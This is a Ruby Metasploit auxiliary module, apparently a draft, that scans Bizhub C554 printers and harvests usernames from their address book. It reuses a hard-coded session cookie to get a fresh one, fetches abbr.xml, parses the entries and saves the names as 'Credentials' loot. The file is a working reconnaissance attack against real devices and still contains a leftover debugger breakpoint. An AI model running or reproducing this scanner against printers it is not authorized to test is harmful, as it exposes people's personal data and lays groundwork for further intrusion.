#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'rex/proto/http'
require 'msf/core'
require 'pry-debugger'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Bizzhub C554 address book user information exractor',
      'Description'    => %{
        This module scans Bizzhub C554 printers and harvests user information from the address book.
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
        OptInt.new('RPORT', [ true, "The target port", 80]),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])

      ], self.class)
  end

  def run_host(ip)

    #need to update for SSL enabled printers. In due time.     
    print_status("Attempting to enumerate usernames from: #{rhost}")

   
    usernames = get_usernames
    if usernames.nil?
      print_status("No usernames found")
      return
    end

    users = ""
    usernames.each do | user|
        users << user + "\n"
    end

      #Woot we got usernames so lets save them.
      print_good( "Found the following users: #{users}")
      loot_name     = "Bizzhub.cp.usernames"
      loot_type     = "text/plain"
      loot_filename = "Bizzhub-usernames.text"
      loot_desc     = "Bizzhub Username Harvester"
      p = store_loot(loot_name, loot_type, datastore['RHOST'], users , loot_filename, loot_desc)
      print_status("Credentials saved in: #{p.to_s}")
  end


  def get_usernames
    usernames = []
    #while pages >= 0 do 
    #  user_record_page = "#{@uri_page}&startRecord=#{pages}"
      
    get_cookie_url = "http://#{rhost}/wcd/index.html?access=ABR_ABR"

    headers = {
      'Cookie' => "ID=f0c6eb7abd5ee73bc9fd842913501cc4; bv=Firefox/28.0; uatype=NN; selno=Auto; lang=En; favmode=false; vm=Html; usr=C_ABR; param="
    }
   
    res = send_request_cgi(
         {
            'uri'       => get_cookie_url,
            'method'    => 'GET',
            'Referer'   => "http://#{rhost}/wcd/abbr.xml",
            'headers'   => headers
           }, datastore['TIMEOUT'].to_i)

      id = res.headers['Set-Cookie']

      get_address_book_url = "http://#{rhost}/wcd/abbr.xml"

      headers = {
        'Cookie' => "#{id}; bv=Firefox/28.0; uatype=NN; selno=Auto; lang=En; favmode=false; vm=Html; usr=C_ABR; param="
      }

      begin
        res = send_request_cgi(
          {
            'uri'       => get_address_book_url,
            'method'    => 'GET',
            'headers'    => headers
          }, datastore['TIMEOUT'].to_i)
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
        print_error("#{rhost}:#{rport} - Connection failed.")
        return 
      end

      if res == nil
        print_error("#{rhost}:#{rport} - Connection failed.")
        return 
      end
    
      xml_doc = ::Nokogiri::XML(res.body)
      xml_doc.xpath("//To").each do | val|
        usernames << val.text.split('@')[0]
      end
      binding.pry
      return usernames.uniq
  end
end
